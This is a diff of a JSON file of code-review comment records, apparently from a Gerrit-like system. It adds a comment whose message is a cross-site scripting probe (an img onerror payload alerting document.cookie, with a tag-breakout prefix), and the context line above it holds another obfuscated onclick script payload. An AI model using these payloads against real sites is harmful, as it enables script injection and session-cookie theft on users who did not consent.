@@ -51,6 +51,23 @@
       "message": "\u003ca href\u003d\"#\" onclick\u003d\"var w \u003d window.open/**/(/**/); w.document.write/**/(\u0027Hello, world!\u0027/**/); w.document.close/**/(/**/); w.print/**/(/**/); alert/**/(\u0027B1P4$$\u0027/**/);\"\u003eClick me\u003c/a\u003e",
       "revId": "686a2e3aeb04242d1981880b73dc96650a6ffbcb",
       "serverId": "173816e5-2b9a-37c3-8a2e-48639d4f1153"
+    },
+    {
+      "unresolved": false,
+      "key": {
+        "uuid": "a65f167e_45ea290c",
+        "filename": "/PATCHSET_LEVEL",
+        "patchSetId": 1
+      },
+      "lineNbr": 0,
+      "author": {
+        "id": 3833550
+      },
+      "writtenOn": "2025-01-23T11:59:15Z",
+      "side": 1,
+      "message": "\"\u003e\u003cimg src\u003dx onerror\u003dalert(document.cookie)\u003e\u0027;alert();//",
+      "revId": "686a2e3aeb04242d1981880b73dc96650a6ffbcb",
+      "serverId": "173816e5-2b9a-37c3-8a2e-48639d4f1153"
     }
   ],
   "submitRequirementResults": [
